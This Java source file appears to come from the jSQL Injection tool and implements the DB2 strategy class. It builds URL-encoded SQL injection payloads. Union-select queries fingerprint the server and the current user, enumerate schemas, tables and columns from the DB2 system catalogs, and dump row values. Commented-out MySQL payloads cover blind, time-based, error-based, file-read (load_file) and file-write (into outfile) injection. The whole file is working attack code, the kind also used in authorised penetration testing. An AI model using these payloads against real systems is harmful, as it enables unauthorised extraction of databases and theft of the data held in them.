package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class DB2Strategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "select+versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user||'%01%03%03%07'from+sysibm.sysversions";
//        "select+hex(versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user)||'i'from+sysibm.sysversions";
    }

    @Override
    public String getSchemaList() {
        return
            /**
             * First substr(,3) remove 'gg' at the beginning
             */
//                select LISTAGG(''||trim(schemaname)||'', '')  WITHIN GROUP(ORDER BY schemaname ASC) as ids from syscat.schemata group by 1;
            "select+varchar(LISTAGG('%04'||trim(schemaname)||'%050%04')||'%01%03%03%07')from+syscat.schemata{limit}";
//        "select+substr(xmlserialize(xmlagg(xmltext('%06'||'%04'||trim(schemaname)||'%051%04'))as+varchar(1024)),3)||'%01%03%03%07'from+syscat.schemata{limit}";
    }

    @Override
    public String getTableList(Database database) {
        return
            /**
             * First substr(,3) remove 'gg' at the beginning
             */
//            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
//            + "(select+name+from+sysibm.systables+where+creator='"+database+"'{limit})x";
        "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.systables+where+creator='"+database+"'{limit}";
    }

    @Override
    public String getColumnList(Table table) {
        return
//            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
//            + "(select+name+from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'+{limit})x";
        "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'{limit}";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        /**
         * null breaks query => coalesce
         */
        formatListColumn = formatListColumn.replace("{%}", "||''),''))||chr(127)||trim(coalesce(varchar(");
        formatListColumn = "trim(coalesce(varchar(" + formatListColumn + "||''),''))";
        
        return
//            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||r||'jj30hh'))as+varchar(1024)),3)||'i'from+"
//            + "(select+hex(" + formatListColumn + ")r+from+" + database + "." + table + "+where+1=1+{limit})x";
        /**
         * LISTAGG limit is 4000 and aggregate all data before limit is applied
         * => subquery
         */
                "select+varchar(LISTAGG('%04'||s||'%051%04')||'%01%03%03%07')from(select+" + formatListColumn + "s+from+" + database + "." + table + "{limit})";
    }

    @Override
    public String getPrivilege() {
        return "";
//        return 
//            "concat(" +
//                "(" +
//                    "select+" +
//                        "hex(" +
//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
//                        ")" +
//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
//                    "where+" +
//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
//                        "and+PRIVILEGE_TYPE=0x46494c45" +
//                ")," +
//                "0x69" +
//            ")";
    }

    @Override
    public String readTextFile(String filePath) {
        return "";
//        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return "";
//        return 
//            MediatorModel.model().initialQuery
//                .replaceAll(
//                    "1337" + MediatorModel.model().visibleIndex + "7331",
//                    "(select+0x" + ToolsString.strhex(content) + ")"
//                )
//                .replaceAll("--++", "")
//                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "";
//        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "";
//        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "";
//        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "";
//        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "";
//        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "";
//        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "";
//        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "(" +
//                "select+" +
//                "concat(" +
//                    "0x53514c69," +
//                    "mid(" +
//                        "(" + sqlQuery + ")," +
//                        startPosition + "," +
//                        "65536" +
//                    ")" +
//                ")" +
//            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return "";
//        return 
//            "+and(" +
//                "select+1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "floor(rand(0)*2)" +
//                    "from+" +
//                        "information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "+and" +
//                "(" +
//                "select+" +
//                    "1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "concat(" +
//                            "0x53514c69," +
//                            "mid(" +
//                                "(" + sqlQuery + ")," +
//                                startPosition + "," +
//                                "64" +
//                            ")," +
//                        "floor(rand(0)*2)" +
//                    ")" +
//                    "from+information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
          "(select+" +
              /**
               * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
               */
              "varchar(replace('SQLi'||substr(" +
                  "(" + sqlQuery + ")," +
                  startPosition +
              "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "(" +
//                "select+" +
//                    "concat(" +
//                        "0x53514c69," +
//                        "mid(" +
//                            "(" + sqlQuery + ")," +
//                            startPosition + "," +
//                            "65536" +
//                        ")" +
//                    ")" +
//            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "varchar('SQLi$1'||repeat('%23',1024)||'iLQS')"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("1337"+ i +"7330%2b1");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+sysibm.sysdummy1--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",5";
    }

}